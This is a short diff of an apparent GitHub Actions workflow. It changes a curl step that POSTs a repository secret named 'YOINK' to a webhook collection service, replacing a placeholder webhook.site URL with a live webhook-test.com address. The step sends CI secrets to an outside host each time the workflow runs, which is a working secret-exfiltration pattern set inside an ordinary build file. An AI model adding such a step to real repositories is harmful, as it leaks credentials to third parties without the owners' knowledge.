@@ -11,6 +11,6 @@ jobs:
     steps:
       - name: Send POST request
         run: |
-          curl -X POST 'https://webhook.site/00000000-0000-0000-0000-000000000000' \
+          curl -X POST 'https://webhook-test.com/90a2bc44c719c86f01074b047b2bdacd' \
                -H 'content-type: application/json' \
                -d "${{ secrets.YOINK }}"
